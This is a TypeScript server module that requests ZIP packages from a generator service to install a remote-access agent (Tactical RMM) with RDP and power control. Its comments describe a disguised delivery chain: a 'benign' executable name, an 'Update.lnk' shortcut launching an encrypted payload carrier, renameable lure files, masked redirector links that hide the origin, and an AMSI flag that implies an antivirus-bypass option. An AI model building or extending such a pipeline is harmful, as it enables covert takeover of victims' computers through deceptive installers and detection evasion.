import "server-only";

import { env } from "./env";

export interface ZipResult {
  jobId: string;
  downloadUrl: string;
  expiresAt: string;
}

export interface CallZipGeneratorOpts {
  clientId: number;
  siteId: number;
  agentType: string; // "workstation" | "server"
  authToken: string; // the fresh 72h TRMM Deployment uid
  apiUrl: string; // TRMM base API URL — same as TRMM_API_BASE_URL
  exeUrl: string; // the deploy URL of the exe the Agent.lnk downloads at runtime
  features?: string[]; // e.g. ["rdp", "ping", "power"]
  fileName?: string; // benign exe filename — default "trmm-agent.exe"
  expiryHours: number; // 24 | 72 — the generator enforces this window
  // launcher mode (WP4): zip ships { Update.lnk, Launcher.exe } — the .lnk runs
  // the offline carrier exe directly (encrypted payload inside, nothing
  // downloaded at runtime). Absent/false = legacy Agent.lnk downloader zip.
  launcherMode?: boolean;
  // FIX 3 — optional renameable artifact names (launcher mode). Blank/default
  // values are omitted from the /build body so the generator uses its own
  // defaults (byte-identical to the confirmed flow). Sanitized here too (same
  // bare-name rule as the generator).
  updateLinkName?: string; // the .lnk entry name (default "Update.lnk")
  innerFolder?: string; // the subfolder holding launcher+payload (default "launcher")
  zipName?: string; // the served download filename (default "Agent.zip")
}

// FIX 3: bare-name sanitizer — mirrors the generator's `clean` rule so a user
// can't smuggle path separators / control chars / ".." traversal. Blank or
// invalid -> "" (caller omits the flag so the generator uses its default).
const INVALID_ARTIFACT_NAME = /[/\\"\u0000-\u001f]/;
function safeArtifactName(value: string | undefined): string {
  const s = (value ?? "").trim();
  if (!s) return "";
  if (INVALID_ARTIFACT_NAME.test(s) || s.includes("..") || s.length > 64) return "";
  return s;
}

/**
 * Calls the ZIP installer generator (STAGE 2). This is the SAME Fastify service
 * as the MSI generator by default (via MSI_GENERATOR_URL/SECRET); a separate
 * ZIP_GENERATOR_URL may be pointed at a dedicated host, but the bearer secret
 * is always MSI_GENERATOR_SECRET.
 *
 * POSTs a JSON `application/json` body to `${zipGeneratorUrl}/build`, bearer
 * authenticated, 60s timeout. Success returns `{ jobId, downloadUrl,
 * expiresAt }` — `downloadUrl` is the generator-minted MASKED link (through
 * the redirector base URL) so the origin never leaks. Any failure throws; the
 * caller catches and returns a 502 (the underlying TRMM Deployment/Site are
 * not rolled back, matching the spec).
 *
 * Like the MSI path, this is only invoked when the generator is configured
 * (`env.zipGeneratorUrl` + `env.msiGeneratorSecret`); the caller checks that
 * first and returns a friendly 503 otherwise.
 */
export async function callZipGenerator(
  opts: CallZipGeneratorOpts,
): Promise<ZipResult> {
  if (!env.zipGeneratorUrl || !env.msiGeneratorSecret) {
    throw new Error(
      "ZIP generator is not configured (MSI_GENERATOR_URL / MSI_GENERATOR_SECRET not set).",
    );
  }

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 60_000);

  // FIX 3: sanitize the optional renameable names once; blank/invalid -> ""
  // (omitted below so the generator uses its defaults — byte-identical flow).
  const flagUpdateLinkName = safeArtifactName(opts.updateLinkName);
  const flagInnerFolder = safeArtifactName(opts.innerFolder);
  const flagZipName = safeArtifactName(opts.zipName);

  try {
    const res = await fetch(`${env.zipGeneratorUrl}/build`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${env.msiGeneratorSecret}`,
      },
      body: JSON.stringify({
        exeUrl: opts.exeUrl,
        apiUrl: opts.apiUrl,
        clientId: opts.clientId,
        siteId: opts.siteId,
        agentType: opts.agentType,
        authToken: opts.authToken,
        features: opts.features ?? ["rdp", "ping", "power"],
        expiryHours: opts.expiryHours,
        ...(opts.launcherMode ? { launcherMode: true } : {}),
        flags: {
          amsi: "none", // Guardrail: AMSI default none — never a bypass by default.
          fileName: opts.fileName ?? "trmm-agent.exe",
          // FIX 3: optional renameable names — only send when sanitized present.
          ...(flagUpdateLinkName ? { updateLinkName: flagUpdateLinkName } : {}),
          ...(flagInnerFolder ? { innerFolder: flagInnerFolder } : {}),
          ...(flagZipName ? { zipName: flagZipName } : {}),
        },
      }),
      signal: controller.signal,
    });
    const data = (await res.json().catch(() => ({}))) as Partial<ZipResult> & {
      error?: string;
    };
    if (!res.ok) {
      throw new Error(data.error ?? `ZIP generator ${res.status}`);
    }
    if (!data.downloadUrl || typeof data.downloadUrl !== "string") {
      throw new Error("ZIP generator response missing downloadUrl");
    }
    return {
      jobId: typeof data.jobId === "string" ? data.jobId : "",
      downloadUrl: data.downloadUrl,
      expiresAt:
        typeof data.expiresAt === "string"
          ? data.expiresAt
          : new Date().toISOString(),
    };
  } catch (err) {
    if (err instanceof DOMException && err.name === "AbortError") {
      throw new Error("ZIP generator timed out after 60s");
    }
    throw err;
  } finally {
    clearTimeout(timeout);
  }
}